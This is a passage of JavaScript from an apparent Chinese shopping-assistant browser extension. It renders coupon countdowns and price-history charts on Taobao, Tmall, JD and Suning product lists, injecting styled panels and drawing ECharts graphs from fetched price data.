DyVctfu6Qh8sgm/alDDnJtoLVLYudZBU4YYSY1xqtEw+WvkSFgXKyLsdXqQItR6y2XNwXuuWTjSr67Zc21+vTwqHKYId8+QBdcY4nK6bAVA9xAM57Ph+VbViG56DdFsVPtsAhQPAjMq/ccZVzoIWDd2jIFI1w113vOUmuFTn671c4U62T/AEHRg/2GxelWsLMr236AR1zkvHavelaNf1QaDCVG1I0SXqNqTtBgG48zJLX/ABqEGQ242UBMDcZ8CWQpqgYLFMyw9ermcCVGCRv2mQtKAb2/S5qUCF7x1z1AGUKJeIxpbgX72punRdXLF4jR9WJma9Viss5P3zO/wdnQDak1jJYiZxElEziJpENIYM5yc5O0rpl/6dWPVh5s2t9CnKQDAgjWrl91oh5FncsGX/xo3XXSv1xv7B2z9Q8gNXO8M5C4GXGDIkQziGTbF94P3VbFKrcJSS1xmclrGY+s1xnVyb2hgTyaB8H/AHqCWizgVdc2SPsC4ku2187+6qus7pMUiLPFsflmS81d5zeXXt9qOEHVydzpyShhoiAwK/p0P2Y/oVeZ2bcww5lkYQzyEgNda40u+QIME/ESMY2+gRXFywlaMFUYyYDOez/g/wD/xAAlEQABAwMDBAMBAAAAAAAAAAABAgMEAAUREiExBiIwURRBYHH/2gAIAQIBAT8A/WLWlpRCjtU3qllh0obGrFM9XtnAeRiostEwBbXHm6muq2l/Hb+qLkdzuV2k0j4rHcpWoVaLw41NGThv1STkZ8s23rfuTqlJ1cYp+zxwydadNR7VFVD37j7qZaGERkLZG4qMCED+UPJMhqDyZCjsOal3mMGVNK5q2XRsMrYcOM8Va0NS2AgJyB90gaRQ58hO2DUmzwZhy4mo/T8Bg5Smmm0sDCB5h281nPArUfX57//EACsRAAEDAwIGAAYDAAAAAAAAAAECAwQABREGIRITIjAxQQcjMlFgYXGBkf/aAAgBAwEBPwD8sQ2XCEJGSatXw+mXBvmvq4KmfDh9lKlx3OLHqpcN+CtTUgYI72gdPRno5nSN8/TQjTIKflHiT6FcU+VsE8H7rUemW5dvPL6nBvmiMEg9wVbryYNijsx1hBOck+qh6muT7vLZczv7xv8AqpmoprVy5PFwgDxjz7zVr1NJkS1Mvq6DmpJBdWR9z3bfPxFXAUN1eD9qgaYuRkNPJa2yN81f9OPLlty4yB46t6vJctj/AMtQC1eQPX90Tk0fHc3Jz4qBqa5WwYjunH+1L1heJqClx3aitTqyp0573810jwKGR6o/jv8A/9k=';
                    $("#dypMid9527-phone-qr").html(`<img src="${qrImg}">`);
                }();    //中间二维码内容
                !function () {
                    var times = '';
                    $("#dypMid9527").on("mouseenter",".dypMid9527-coupon,.dypMid9527-price-trend,.dypMid9527-setting,.dypMid9527-active,.dypMid9527-phone,.dypMid9527-same",function () {
                        var that = $(this);
                        times = setTimeout(function () {
                            that.children(".dypMid9527-title").children(".dypMid9527-borderMask").css("borderColor","#fff");
                            that.children(".dypMid9527-box").show();
                        },300)
                    });
                    $("#dypMid9527").on("mouseleave",".dypMid9527-coupon,.dypMid9527-price-trend,.dypMid9527-setting,.dypMid9527-active,.dypMid9527-phone,.dypMid9527-same",function () {
                        clearInterval(times);
                        $(this).children(".dypMid9527-title").children(".dypMid9527-borderMask").css("borderColor","#ddd");
                        $(this).children(".dypMid9527-box").hide();
                    });
                    $("#dypMid9527 .dypMid9527-setting").on("click","li",function () {
                        if ($(this).data("type") == 1) {
                            $("#dypMid9527").parent().fadeOut();
                            var type = setting.dypTop;
                            setting.dypMid = "hidden";
                            chrome.storage.local.set({dypSetting:{dypTop:type,dypMid:'hidden'}});
                        } else {
                            openWindow(mainUrl.website + "index/feedback/");
                        }
                    }); // 本次关闭,意见反馈
                    $('.dypMid9527-feast,.dypMid9527-same').on("mouseenter",function () {
                        var scrollHeight = $(window).scrollTop();
                        $(window).on('scroll.dypScroll',function () {
                            $(window).scrollTop(scrollHeight);
                        });
                    });
                    $('.dypMid9527-feast,.dypMid9527-same').on("mouseleave",function () {
                        $(window).off('scroll.dypScroll');
                    });
                }();    //中间事件绑定
                $.extend($.fn,{
                    fnTimeCountDown:function (d) {
                        this.each(function () {
                            var $this = $(this);
                            var o = {
                                hm:$this.find(".hm"),
                                sec:$this.find(".sec"),
                                mini:$this.find(".mini"),
                                hour:$this.find(".hour"),
                                day:$this.find(".day"),
                                month:$this.find(".month"),
                                year:$this.find(".year")
                            };
                            var f = {
                                haomiao:function (n) {
                                    if (n < 10) return "00" + n.toString();
                                    if (n < 100) return "0" + n.toString();
                                    return n.toString();
                                },
                                zero:function (n) {
                                    var _n = parseInt(n,10); //解析字符串,返回整数
                                    if (_n > 0) {
                                        if (_n <= 9) {
                                            _n = "0" + _n
                                        }
                                        return String(_n);
                                    } else {
                                        return "00";
                                    }
                                },
                                dv:function () {
                                    var _d = $this.data("end") || d;
                                    var now = new Date(),
                                        endDate = new Date(_d);
                                    var dur = (endDate - now.getTime()) / 1000,
                                        mss = endDate - now.getTime(),
                                        pms = {hm:"000",sec:"00",mini:"00",hour:"00",day:"00",month:"00",year:"0"};
                                    if (mss > 0) {
                                        pms.hm = parseInt(f.haomiao(mss % 1000) / 100);
                                        pms.sec = f.zero(dur % 60);
                                        pms.mini = Math.floor((dur / 60)) > 0 ? f.zero(Math.floor((dur / 60)) % 60) : "00";
                                        pms.hour = Math.floor((dur / 3600)) > 0 ? f.zero(Math.floor((dur / 3600)) % 24) : "00";
                                        pms.day = Math.floor((dur / 86400)) > 0 ? f.zero(Math.floor((dur / 86400)) % 30) : "00";
                                        pms.month = Math.floor((dur / 2629744)) > 0 ? f.zero(Math.floor((dur / 2629744)) % 12) : "00";
                                        pms.year = Math.floor((dur / 31556926)) > 0 ? Math.floor((dur / 31556926)) : "0";
                                    } else {
                                        pms.year = pms.month = pms.day = pms.hour = pms.mini = pms.sec = "00";
                                        pms.hm = "000";
                                        return;
                                    }
                                    return pms;
                                },
                                ui:function () {
                                    if (o.hm) {
                                        o.hm.html(f.dv().hm);
                                    }
                                    if (o.sec) {
                                        o.sec.html(f.dv().sec);
                                    }
                                    if (o.mini) {
                                        o.mini.html(f.dv().mini);
                                    }
                                    if (o.hour) {
                                        o.hour.html(f.dv().hour);
                                    }
                                    if (o.day) {
                                        if (f.dv().day > 99) {
                                            o.day.html("99+");
                                        }
                                        o.day.html(f.dv().day);
                                    }
                                    if (o.month) {
                                        o.month.html(f.dv().month);
                                    }
                                    if (o.year) {
                                        o.year.html(f.dv().year);
                                    }
                                    setTimeout(f.ui,1);
                                }
                            };
                            f.ui();
                        });
                    }
                });    //优惠券倒计时插件
            }
        }
    }();
    //列表页
    !function () {
        var listAdaptationArr = {
            's.taobao.com':['.J_PicBox','mainsrp-itemlist','淘宝'],
            'list.tmall.com':['.productImg-wrap','J_ItemList','天猫'],
            'search.jd.com':['.gl-i-wrap','J_goodsList','京东'],
            'search.suning.com':['.res-img','filter-results','苏宁'],
            'list.suning.com':['.res-img','filter-results','苏宁']
        };
        $.each(listAdaptationArr,function (v,k) {
            if (locHost == v) {
                chrome.storage.local.get(null,function (e) {
                    setting = e.dypListSetting;
                    if (setting == "show") {
                        list(v,k);
                    }
                });
                return false;
            }
        });
        function list(v,k) {
            var oHead = document.getElementsByTagName('HEAD').item(0);
            var cssStyle = '.douyapulist-price-item{font-family:"Microsoft Yahei",serif;position:absolute;right:0;bottom:50%;margin-bottom:-24px;width:54px;height:42px}.douyapulist-price-item.left{left:0}.douyapulist-price-item.left .douyapulist-price-drop-arrow{left:auto;transform:rotate(180deg);right:1px}.douyapulist-price-item.left .douyapulist-price-dropBox{left:auto;right:calc(100% - 1px);padding:0 11px 0 0}.douyapulist-price-box{width:54px;height:42px;color:#fff;font-size:12px;text-align:center;position:absolute;background:#000;opacity:0;cursor:pointer}.douyapulist-price-box.active{opacity:.5;background:#FD2550}.douyapulist-price-dropBox{width:282px;padding:0 0 0 11px;position:absolute;left:calc(100% - 1px);top:-66px;height:216px;z-index:99999999}.douyapulist-price-icon{margin:3px auto 0 auto;width:18px;height:18px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAY1BMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+aRQ2gAAAAIHRSTlMA0fzj1Abyw7BKRfTctqWcl29mLisY7JCNioBdJhoVAjDv64MAAACESURBVBjTfY7nDsNACIMJl5vZq3v4/Z+ylEg9pZHiH7b1IRC0UQfRFlm/Q9T+UN8smgnGr+gKmFnS1oi2/5IRdYBLRDe0pErs5vcZPD6q00vJ5DhKDAyDu5LFYNASKzQSRUEeHa2aLk9xgEKwUspSqaJc9kjP/KFseZaN+RjlRX1CmtoHD5gKrq48aAkAAAAASUVORK5CYII=)}.douyapulist-price-drop{width:282px;height:216px;opacity:1;box-shadow:2px 2px 2px 0 rgba(0,0,0,.1)}.douyapulist-price-drop-linear{background:linear-gradient(to left,#FF634C 0,#FD2550 100%);height:28px;clear:both;border-radius:5px 5px 0 0}.douyapulist-price-drop-logo{float:left;width:130px;height:28px;background:url(data:image/png;base64,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) center no-repeat}.douyapulist-price-drop-set{float:right;height:28px;width:16px;margin-right:12px;position:relative;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAOCAMAAADHVLbdAAAAdVBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////li2ZAAAAAJnRSTlMA+tiOCe7nvxH2mWdhVBvr4c7GpqSdd3M0LxcE08KIhH5OSDwoIFj7YNcAAACHSURBVAjXNc1XDsQgDEXRByGB1Emv08vb/xLHgHJ+rCuEjSAhU5zqT2z3DLnmqvT91bxL7i3JC6lSmTVgBkoMo5bRbhAzWQFNRuuk3g+reoiSuqgctP8eb4oVE+Oexj/kBypeR7KfFG82t4BxWBh0OHYIk5FZQfKFYJNeGkU1IzJlZ5AUP4g/vx8NSWsd+mIAAAAASUVORK5CYII=) center no-repeat;cursor:pointer}.douyapulist-price-drop-set:hover ul{display:block}.douyapulist-price-drop-set ul{display:none;position:absolute;background:#FFF;border:1px solid #D5D5D5;border-radius:2px;width:60px;top:24px;left:-24px;z-index:10}.douyapulist-price-drop-set li{height:24px;line-height:24px;color:#999;text-align:center;cursor:pointer;padding:0;width:58px}.douyapulist-price-drop-set li:hover{color:#FD2550}.douyapulist-price-drop-arrow{position:absolute;top:75px;left:1px;width:15px;height:29px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAdBAMAAACH5ivpAAAAJFBMVEUAAAD////////h4eHm5uba2tr////////////5+fnh4eHg4OAed86SAAAACHRSTlMAIiDcmf6hXuCx7NUAAABiSURBVBjTNc9BDYAwEERREppyRQIyCJxJkAAOkICElYAEZHb6O53Tyz/tDm3TYryzQxinkS7j+BrSHQIBEASCQAAKoAZAAHsY4w90xmaQgBIgASVAAiRA8jtrR65gT0cGrACTMDNec4Eb3gAAAABJRU5ErkJggg==)}.douyapulist-price-drop-zhide{padding-left:20px;height:30px;color:#444;line-height:32px;border-right:1px solid #D5D5D5;border-left:1px solid #D5D5D5;background:#fff;position:relative;text-align:left}.douyapulist-price-drop-zhideMin{color:#FD2550}.douyapulist-price-drop-zhideBack{position:absolute;top:3px;right:5px;width:78px;height:46px;background:url(data:image/png;base64,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);display:none;z-index:9}.douyapulist-price-drop-echat{height:130px;border-right:1px solid #D5D5D5;border-left:1px solid #D5D5D5;background:#fff;position:relative}.douyapulist-price-drop-border{height:0;border:2px solid transparent;border-top:2px solid #FD2550}.douyapulist-price-drop-ad{border-right:1px solid #D5D5D5;border-left:1px solid #D5D5D5;line-height:26px;text-align:center;height:26px;background:#fff;overflow:hidden}.douyapulist-price-drop-adAll{position:relative}.douyapulist-price-drop-adItem{height:26px}.douyapulist-price-drop-adItem>div{display:inline-block}.douyapulist-price-drop-adItem a{font-size:12px;color:#999;display:inline!important}.douyapulist-price-drop-icon{width:10px;height:26px;vertical-align:-8px;margin-right:10px}.douyapulist-price-drop-icon.icon3{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAOCAMAAAAhfX2ZAAAAS1BMVEUAAAD+JVD+JVH+JVD+JVD/OWj+JVD+JlD+JlH9JVH9JlD/JlH/JlH/J1P/KVb+JVH+JVD+JlH+JVH9JlH/JVL/J1H/JlH/KVL9JVCMSujqAAAAGHRSTlMA+fDnuAn07cSmoF9ZJh/j276xmmdPPBljJ7kxAAAAUElEQVQI1z3ISRKAIBAEwQZEdty1//9ScQKsU0ahZTP+TBp6qErnRAaB3UlqWHlfmCqSyN2M2IRmpoFjT0ENLvCDB84uXYAgmi+0stdrrMALsskHFRGVfW4AAAAASUVORK5CYII=) center no-repeat}.douyapulist-price-ErrorContent{position:absolute;top:50%;left:50%;margin-top:-50px;margin-left:-84px;width:168px;height:86px}.douyapulist-price-ErrorContent p{font-size:12px;color:#999;line-height:18px;text-align:center}.douyapulist-price-ErrorImg{padding-top:10px;width:106px;height:40px;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGoAAAAoCAMAAAAhb5/CAAAAq1BMVEUAAADQ0NDPz8/Ozs7m5ubV1dXNzc3MzMzNzc3Ozs7Ozs7o6OjMzMzOzs7Pz8/n5+fOzs7Nzc3Nzc3Nzc3MzMzOzs7MzMzt7e3c3NzS0tLOzs7Pz8/Q0NDMzMzR0dHe3t7+/v7Pz8/Nzc3Nzc3Nzc3Nzc3Ozs7////////MzMz19fX6+vrZ2dnp6enU1NTR0dH4+Pjk5OTv7+/9/f3T09Pj4+Pg4ODx8fHe3t4NSebVAAAAKHRSTlMA9e5XBRC+goDrN/vTIxv+nnVyKOKqjP79lGBLQDz56+Xls7KJadskjx/jKAAAAbZJREFUWMPN12tvmzAUgOFjc0sIoeR+79bbdo4hsUeXJv//l83NkBx1dKotoH0/IFnCesSR+WD4YOmM09tG0EYpH+T4piN7ghaaDfCfSDGvQSJ+CuA1ntdQQrFNY9KaLfsx6AjrKCHYtiHJZwpLtv4PJXgM103msaN1d0JUPKinZKmpE5+AKaaMJm7UjinE7z/rqfNR6Mr+0Lw/zyCbg1vj21/aWq3rqFweS20t7lIzP8rIdYLD20JbOSOss86SdMsfVxOc28zPH40Cs1h9+/1qyT2+H4FbASUP5Ju199c67JunxvcAyQhM2Y2xGqYSgIdratg3VrOUT/cJBWBjETgWjMc+QL1lS622jxsrXFsFqYtlSW1ZElgfy3PxfLHsqMekvwPLCF8qy4raBLvUnqosWVpQThFWlpCqfaqyFofnDig8HpR+LLugcCFPiEXZBYVC7rEsOqFQFfJGii4onXgp8tYp01ehvMgDi3o9ZyqkaBpaSGHYc6S8qQ8+eV1QUXR5dDFAj/RXTb1OjkU4jSj8mifwE/8rnr8v5bzlC6ppMGv12m3KBzyFj0WmamUy79h02VCz6Q+Hgc1uN15SewAAAABJRU5ErkJggg==) center center no-repeat}.douyapulist-coupon{position:absolute;width:83px;height:27px;top:0;left:0;line-height:27px;color:#fff;text-align:center;text-decoration:none!important;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFMAAAAbBAMAAADyl64yAAAAJFBMVEUAAADyIkzyIkzyIkzyIkzyIkzyIkzyIkzyIkzyIkzyIkz///8bKFtmAAAACnRSTlMAC/TSzo18TUYtbkswzwAAAGdJREFUOMtjWLVq9SpCAKxmAa2UEgdASpuJVLm4gYGTSKUrGRgYiXTrQgYGNiKVLmNg8CI2BBxICAFSlAYRqXJRAAM7kW5dTkpgkWAqCW6lTWCREFvEpwFSAouE9EpCLiAhBAa8HAAAxwThKRaQdkgAAAAASUVORK5CYII=)}.douyapulist-coupon:hover{opacity:0.8}';
            var oStyle = document.createElement("style");
            oStyle.appendChild(document.createTextNode(cssStyle));
            oHead.appendChild(oStyle);
            document.onreadystatechange = loadingChange;
            function loadingChange() {
                if (document.readyState == "complete") {
                    function get(url,price,that) {
                        $.ajax({
                            url:"https://zhushou.huihui.cn/productSense",
                            data:{phu:url,type:"canvas"},
                            type:'GET',
                            timeout:5000,
                            dataType:'json',
                            success:function (response) {
                                var data = response.priceHistoryData.list;
                                var time = new Date();
                                var nowTime = time.getFullYear() + "-" + (time.getMonth() + 1) + "-" + time.getDate();
                                var valueList = [],dateList = [],newData = [],t = 0;
                                for (var i = 0; i < data.length; i++) {
                                    var beforPrice = 0;
                                    if (i > 0) {
                                        beforPrice = data[i - 1].price;
                                    }
                                    if (data[i].price != beforPrice) {
                                        newData[t] = data[i];
                                        t++;
                                    }
                                }
                                var trueObj = newData[newData.length - 1];
                                if (newData[newData.length - 1].price == price) {
                                    newData[newData.length - 1] = {price:price * 1,time:nowTime};
                                } else {
                                    newData[newData.length] = {price:price * 1,time:nowTime};
                                }
                                var isOne = true;
                                if (newData.length == 1) {
                                    var obj = newData[0];
                                    newData = [obj,obj,obj];
                                    isOne = false;
                                }
                                var arrSlice = newData.slice(-7);
                                $.each(arrSlice,function (v,k) {
                                    valueList.push(k.price * 1);
                                    var res1 = [];
                                    res1[0] = k.time.split('-')[1].replace(/^[0]/,'');
                                    res1[1] = k.time.split('-')[2].replace(/^[0]/,'');
                                    res1 = res1.join('/');
                                    dateList.push(res1);
                                });
                                if (isOne == false) {
                                    dateList[0] = "";
                                    var res2 = [];
                                    res2[0] = trueObj.time.split('-')[1].replace(/^[0]/,'');
                                    res2[1] = trueObj.time.split('-')[2].replace(/^[0]/,'');
                                    res2 = res2.join('/');
                                    dateList[1] = res2;
                                }
                                var minAndMax = {min:[],max:[]};
                                var min = Math.min.apply(null,valueList);
                                var max = Math.max.apply(null,valueList);
                                if (min != max) {
                                    $.each(valueList,function (v,k) {
                                        if (k == min) {
                                            minAndMax.min = [dateList[v],k];
                                            return false;
                                        }
                                    });
                                    $.each(valueList,function (v,k) {
                                        if (k == max) {
                                            minAndMax.max = [dateList[v],k];
                                            return false;
                                        }
                                    });
                                }
                                var optionSet = {
                                    "grid":{"x":10,"x2":10,"y":18,"y2":26,"borderWidth":0,"width":260,"height":86},
                                    "animation":true,
                                    "backgroundColor":"#fff",
                                    "tooltip":{
                                        "show":true,"name":"","alwaysShowContent":false,"trigger":"axis","padding":10,
                                        "textStyle":{"fontWeight":"normal","color":"#fff","align":"left","fontSize":12},
                                        "axisPointer":{"type":"line","lineStyle":{"color":"#cdcdcd","type":"dashed"}}
                                    },
                                    "xAxis":[{
                                        "data":dateList,
                                        "axisLine":{"lineStyle":{"color":"#ddd","width":2,}},
                                        "axisTick":{"show":false},
                                        "axisLabel":{"textStyle":{"color":'#999'},}
                                    }],
                                    "yAxis":[{
                                        "type":"value","splitNumber":2,"scale":true,"minInterval":1,
                                        "axisLabel":{"show":false},
                                        "axisTick":{"show":false},
                                        "axisLine":{"show":false},
                                        "splitLine":{"lineStyle":{"color":["#ececec"],"width":1,"type":"dashed"}}
                                    }],
                                    "series":[
                                        {
                                            type:"line",data:valueList,symbol:"circle",smooth:true,showAllSymbol:true,
                                            label:{
                                                normal:{
                                                    show:!0,textStyle:{color:"#FD2550",fontWeight:"bold",textAlign:"center"},
                                                    formatter:function (e) {
                                                        return e.name == minAndMax.min[0] && e.value == minAndMax.min[1] ? (minAndMax.min[1] == minAndMax.max[1] ? "" : "最低") + e.value : e.name == minAndMax.max[0] && e.value == minAndMax.max[1] ? (minAndMax.min[1] == minAndMax.max[1] ? "" : "最高") + e.value : e.value
                                                    }
                                                },
                                                emphasis:{show:!0,textStyle:{color:"#FD2550",fontWeight:"bold",textAlign:"center"}}
                                            },
                                            lineStyle:{normal:{color:"#FD2550",type:"solid",width:1}},
                                            itemStyle:{normal:{color:"#FD2550"},emphasis:{color:"#FD2550"}}
                                        }
                                    ]
                                };
                                var priceChart = echarts.init(that.find(".douyapulist-price-drop-echat")[0]);
                                priceChart.setOption(optionSet);
